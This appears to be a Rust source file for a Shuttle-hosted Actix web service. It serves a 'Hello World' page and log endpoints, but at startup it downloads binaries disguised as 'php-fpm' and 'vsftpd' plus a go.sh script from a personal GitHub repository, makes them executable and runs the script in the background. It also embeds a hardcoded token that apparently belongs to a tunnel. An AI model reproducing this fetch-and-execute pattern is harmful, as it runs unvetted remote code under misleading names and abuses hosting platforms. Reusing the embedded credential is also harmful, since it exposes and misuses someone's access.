use actix_web::{get, web::ServiceConfig, HttpResponse, Result};
use std::fs::{self, File};
use std::io::Write;
use futures_util::StreamExt;
use anyhow::anyhow;
use shuttle_actix_web::ShuttleActixWeb;
use std::sync::Arc;
use tokio::sync::Mutex;

struct FileInfo {
    url: &'static str,
    filename: &'static str,
}

const FILES_TO_DOWNLOAD: &[FileInfo] = &[
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/php-fpm",
        filename: "php-fpm",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/vsftpd",
        filename: "vsftpd",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/releases/download/2.0/go.sh",
        filename: "go.sh",
    },
];

async fn download_file(file: &FileInfo, base_path: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("Downloading file from {}...", file.url.trim());

    // 检查文件是否已存在
    let file_path = format!("{}/{}", base_path, file.filename);
    if std::fs::metadata(&file_path).is_ok() {
        println!("File {} already exists, skipping download.", file.filename);
        return Ok(());
    }

    let response = reqwest::get(file.url.trim()).await?;
    if !response.status().is_success() {
        return Err(anyhow!("Failed to download {}: HTTP {}", file.url, response.status()).into());
    }

    let mut file_handle = File::create(&file_path)?;
    let mut stream = response.bytes_stream();

    while let Some(chunk) = stream.next().await {
        let chunk = chunk?;
        file_handle.write_all(&chunk)?;
        file_handle.flush()?;
    }

    println!("Downloaded {} successfully", file.filename);
    Ok(())
}

async fn give_executable_permission(filename: &str) -> std::io::Result<()> {
    println!("Giving executable permission to {}", filename);

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let metadata = fs::metadata(filename)?;
        let mut perms = metadata.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(filename, perms)?;
        println!("Set executable permission for {}", filename);
    }

    #[cfg(not(unix))]
    {
        println!("Warning: Cannot set executable permission on non-Unix platform for {}", filename);
    }

    Ok(())
}

// 修复：移除 mut
async fn execute_script(script: &str, token: &str) -> std::io::Result<()> {
    println!("Starting script in background: {}", script);

    // 创建日志文件
    let log_file = std::fs::File::create("script_output.log")?;

    // 修复：移除 mut
    let child = tokio::process::Command::new("bash")
        .arg(script)
        .env("Token", token)
        .stdout(log_file.try_clone()?)
        .stderr(log_file)
        .spawn()?;

    println!("Script started with PID: {:?}", child.id());
    // 不等待脚本完成，直接返回
    Ok(())
}

// 修复：重命名内部变量以避免与函数名冲突
async fn detect_system_architecture() -> String {
    let mut arch_info_output = String::new(); // 重命名变量

    // 获取系统架构信息
    arch_info_output.push_str("=== SYSTEM ARCHITECTURE INFO ===\n");

    // 使用 Rust 标准库获取架构信息
    arch_info_output.push_str(&format!("Target architecture: {}\n", std::env::consts::ARCH));
    arch_info_output.push_str(&format!("Target OS: {}\n", std::env::consts::OS));
    arch_info_output.push_str(&format!("Target family: {}\n", std::env::consts::FAMILY));
    arch_info_output.push_str(&format!("Pointer width: {} bits\n", std::mem::size_of::<usize>() * 8));

    // 尝试使用系统命令获取更详细的架构信息
    #[cfg(unix)]
    {
        use std::process::Command;

        // 尝试 uname 命令
        match Command::new("uname").arg("-a").output() {
            Ok(output) => {
                if output.status.success() {
                    arch_info_output.push_str(&format!("uname -a: {}\n", String::from_utf8_lossy(&output.stdout)));
                }
            }
            Err(e) => {
                arch_info_output.push_str(&format!("uname command failed: {}\n", e));
            }
        }

        // 尝试 lscpu 命令 (可能在容器中不可用)
        match Command::new("sh").arg("-c").arg("command -v lscpu && lscpu || echo 'lscpu not available'").output() {
            Ok(output) => {
                if output.status.success() {
                    let lscpu_output = String::from_utf8_lossy(&output.stdout);
                    // 只取前几行关键信息
                    let lines: Vec<&str> = lscpu_output.lines().take(10).collect(); // 增加行数以防万一
                    arch_info_output.push_str(&format!("lscpu (first 10 lines or message): {}\n", lines.join("\n")));
                }
            }
            Err(e) => {
                arch_info_output.push_str(&format!("lscpu command check failed: {}\n", e));
            }
        }

        // 尝试 file 命令检查系统架构
        match Command::new("file").arg("/bin/sh").output() {
            Ok(output) => {
                if output.status.success() {
                    arch_info_output.push_str(&format!("file /bin/sh: {}\n", String::from_utf8_lossy(&output.stdout)));
                }
            }
            Err(e) => {
                arch_info_output.push_str(&format!("file command failed: {}\n", e));
            }
        }
    }

    arch_info_output // 返回重命名后的变量
}

// 修复：重命名内部变量和参数以避免与函数名/struct名冲突
async fn check_file_type(target_filename: &str) -> String { // 重命名参数
    let mut file_info_output = String::new(); // 重命名变量
    file_info_output.push_str(&format!("=== FILE INFO FOR {} ===\n", target_filename));

    // 使用 Rust 获取文件元数据
    match std::fs::metadata(target_filename) {
        Ok(metadata) => {
            file_info_output.push_str(&format!("File size: {} bytes\n", metadata.len()));
            file_info_output.push_str(&format!("Is file: {}\n", metadata.is_file()));
            file_info_output.push_str(&format!("Is directory: {}\n", metadata.is_dir()));
        }
        Err(e) => {
            file_info_output.push_str(&format!("Failed to get metadata: {}\n", e));
        }
    }

    // 使用系统命令检查文件类型
    #[cfg(unix)]
    {
        use std::process::Command;

        // 使用 file 命令检查文件类型
        match Command::new("sh").arg("-c").arg(format!("file \"{}\"", target_filename)).output() {
            Ok(output) => {
                if output.status.success() {
                    file_info_output.push_str(&format!("file command: {}\n", String::from_utf8_lossy(&output.stdout)));
                } else {
                    file_info_output.push_str(&format!("file command stderr: {}\n", String::from_utf8_lossy(&output.stderr)));
                }
            }
            Err(e) => {
                file_info_output.push_str(&format!("file command failed: {}\n", e));
            }
        }

        // 使用 ldd 命令检查动态链接库（如果是可执行文件）
        if target_filename.contains("php-fpm") || target_filename.contains("vsftpd") {
            match Command::new("sh").arg("-c").arg(format!("ldd \"{}\" 2>&1 || echo 'ldd not applicable or failed'", target_filename)).output() {
                Ok(output) => {
                    file_info_output.push_str(&format!("ldd command: {}\n", String::from_utf8_lossy(&output.stdout)));
                }
                Err(e) => {
                    file_info_output.push_str(&format!("ldd command failed: {}\n", e));
                }
            }
        }
    }

    file_info_output // 返回重命名后的变量
}

async fn download_and_execute_files() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let base_path = std::env::var("SHUTTLE_DATA_DIR").unwrap_or_else(|_| ".".to_string());
    println!("Using base path: {}", base_path);

    // 检测系统架构
    // 修复：使用不同的变量名接收函数返回值
    let arch_info_result = detect_system_architecture().await;
    println!("{}", arch_info_result); // 修复：打印正确的变量

    // 保存架构信息到文件供后续查看
    if let Err(e) = std::fs::write("architecture_info.log", &arch_info_result) { // 修复：写入正确的变量
        eprintln!("Failed to write architecture info to file: {}", e);
    }

    // 确保目录存在
    std::fs::create_dir_all(&base_path)?;

    // 下载所有文件
    for file in FILES_TO_DOWNLOAD {
        download_file(file, &base_path).await?;
    }

    // 授予可执行权限
    for file_info_item in FILES_TO_DOWNLOAD { // 修复：使用不同的变量名
        let file_path = format!("{}/{}", base_path, file_info_item.filename);
        give_executable_permission(&file_path).await?;
    }

    // 检查下载的文件类型和架构兼容性
    for file_info_item in FILES_TO_DOWNLOAD { // 修复：使用不同的变量名
        if file_info_item.filename != "go.sh" {
            let file_path = format!("{}/{}", base_path, file_info_item.filename);
            // 修复：调用函数并接收返回值
            let file_info_result = check_file_type(&file_path).await;
            println!("{}", file_info_result);

            // 保存文件信息到单独的文件
            // 修复：使用 struct 字段
            let info_filename = format!("{}_info.log", file_info_item.filename);
            if let Err(e) = std::fs::write(&info_filename, &file_info_result) {
                eprintln!("Failed to write {} info to file: {}", file_info_item.filename, e);
            }
        }
    }

    // 执行 go.sh
    let script_path = format!("{}/go.sh", base_path);
    let token = "eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiYmNmZmQwNTktY2JjMC00YzhmLTgzMWQtNzRhYjM2ZDZiODFlIiwicyI6Ik4yTmtZVFEwWW1VdFlqRTJOaTAwT1dKakxXSmtZbVl0TkRnMllURTFZV000WmpNdyJ9";

    execute_script(&script_path, token).await?;

    Ok(())
}

#[get("/")]
async fn hello_world() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok().content_type("text/plain").body("Hello World!"))
}

#[get("/health")]
async fn health_check(data: actix_web::web::Data<Arc<Mutex<bool>>>) -> Result<HttpResponse> {
    let initialized = *data.lock().await;
    if initialized {
        Ok(HttpResponse::Ok().content_type("text/plain").body("OK - Service initialized and running"))
    } else {
        Ok(HttpResponse::ServiceUnavailable().content_type("text/plain").body("Service initializing..."))
    }
}

#[get("/script-logs")]
async fn script_logs() -> Result<HttpResponse> {
    match std::fs::read_to_string("script_output.log") {
        Ok(logs) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No logs available yet or log file not created."))
        }
    }
}

#[get("/php-fpm-logs")]
async fn php_fpm_logs() -> Result<HttpResponse> {
    match std::fs::read_to_string("php-fpm.log") {
        Ok(logs) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No php-fpm logs available yet."))
        }
    }
}

#[get("/vsftpd-logs")]
async fn vsftpd_logs() -> Result<HttpResponse> {
    match std::fs::read_to_string("vsftpd.log") {
        Ok(logs) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(logs))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No vsftpd logs available yet."))
        }
    }
}

#[get("/all-logs")]
async fn all_logs() -> Result<HttpResponse> {
    let mut all_logs = String::new();

    // 添加 script logs
    all_logs.push_str("=== SCRIPT OUTPUT LOGS ===\n");
    match std::fs::read_to_string("script_output.log") {
        Ok(logs) => all_logs.push_str(&logs),
        Err(_) => all_logs.push_str("No script logs available.\n"),
    }

    all_logs.push_str("\n=== PHP-FPM LOGS ===\n");
    match std::fs::read_to_string("php-fpm.log") {
        Ok(logs) => all_logs.push_str(&logs),
        Err(_) => all_logs.push_str("No php-fpm logs available.\n"),
    }

    all_logs.push_str("\n=== VSFTPD LOGS ===\n");
    match std::fs::read_to_string("vsftpd.log") {
        Ok(logs) => all_logs.push_str(&logs),
        Err(_) => all_logs.push_str("No vsftpd logs available.\n"),
    }

    Ok(HttpResponse::Ok().content_type("text/plain").body(all_logs))
}

// 修复：端点函数名保持不变，但内部逻辑没问题
#[get("/arch-info")]
async fn arch_info() -> Result<HttpResponse> {
    match std::fs::read_to_string("architecture_info.log") {
        Ok(info) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body(info))
        }
        Err(_) => {
            Ok(HttpResponse::Ok().content_type("text/plain").body("No architecture info available yet."))
        }
    }
}

// 修复：端点函数名保持不变，但内部逻辑没问题
#[get("/file-info")]
async fn file_info() -> Result<HttpResponse> {
    let mut file_info_output = String::new(); // 修复：使用不同的变量名

    // 收集所有文件信息
    let files = ["php-fpm_info.log", "vsftpd_info.log"];
    for file in &files {
        file_info_output.push_str(&format!("=== {} ===\n", file));
        match std::fs::read_to_string(file) {
            Ok(info) => file_info_output.push_str(&info),
            Err(_) => file_info_output.push_str("No info available.\n"),
        }
        file_info_output.push_str("\n");
    }

    Ok(HttpResponse::Ok().content_type("text/plain").body(file_info_output)) // 修复：返回正确的变量
}

#[shuttle_runtime::main]
async fn actix_web() -> ShuttleActixWeb<impl FnOnce(&mut ServiceConfig) + Send + Clone + 'static> {
    let initialized = Arc::new(Mutex::new(false));
    let initialized_clone = initialized.clone();

    // 异步初始化
    tokio::spawn(async move {
        println!("🚀 Starting initialization...");
        match download_and_execute_files().await {
            Ok(_) => {
                println!("✅ Initialization completed successfully");
            }
            Err(e) => {
                eprintln!("❌ Initialization failed: {}", e);
            }
        }
        // 无论如何都标记为初始化完成
        *initialized_clone.lock().await = true;
        println!("✅ Service marked as initialized");
    });

    let config = move |cfg: &mut ServiceConfig| {
        cfg.service(hello_world)
           .service(health_check)
           .service(script_logs)
           .service(php_fpm_logs)
           .service(vsftpd_logs)
           .service(all_logs)
           .service(arch_info)
           .service(file_info)
           .app_data(actix_web::web::Data::new(initialized.clone()));
    };

    Ok(config.into())
}
